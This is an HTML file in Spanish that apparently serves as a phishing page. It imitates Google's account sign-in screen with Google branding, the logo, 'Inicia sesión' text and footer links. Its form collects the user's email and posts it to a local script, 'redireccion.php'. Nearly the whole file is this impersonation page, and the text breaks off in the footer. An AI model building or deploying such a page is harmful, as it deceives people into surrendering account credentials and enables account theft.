<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">

    <title>Acceso: Cuentas de Google</title>
    <link rel="stylesheet" href="login-styles.css">
</head>
<body>

    <div class="auth-container">
        <!--
        
        <div class="side-info">
            <div class="logo-placeholder">
                <img src="google-recuadro.png" alt="Logo de mi negocio">
            </div>
            <h1>Inicia sesión</h1>
            <p class="subtitle">Utiliza tu cuenta de Google</p>
        </div>
        -->
        <div class="side-form">

            <div class="logo-placeholder">
                <img src="google-recuadro.png" alt="Logo de mi negocio">
            </div>
            <h1>Inicia sesión</h1>
            <p class="subtitle">Utiliza tu cuenta de Google</p>

            <form method="post" action="redireccion.php">
                <div class="input-wrapper">
                    <input type="text" name="username" placeholder="Correo electrónico" required>
                </div>
                
                <a href="#" style="color: var(--google-blue-dark); text-decoration: none; font-size: 14px;">
                    ¿Has olvidado tu correo electrónico?
                </a>
                <!--
                <p class="mixed-text">
                    ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.<span>Más información para usar el modo de invitado</span>
                </p>
                -->
                <div class="action-row">
                    <button type="button" class="btn-secondary" style="color:var(--google-blue-dark); background:none; border:none; cursor:pointer;">Crear cuenta</button>
                    <button type="submit" name="signIn" class="btn-primary">Siguiente</button>
                </div>
            </form>
        </div>
    </div>

    <footer class="footer-external">
        <div class="lang-selector">
            Español (México) ▼
        </div>

        <div class="footer-links">
            <a href="#">Ayuda</a>
            <a href="#">Privacidad</a>
            <a href="#">Condiciones</a>
        </div>
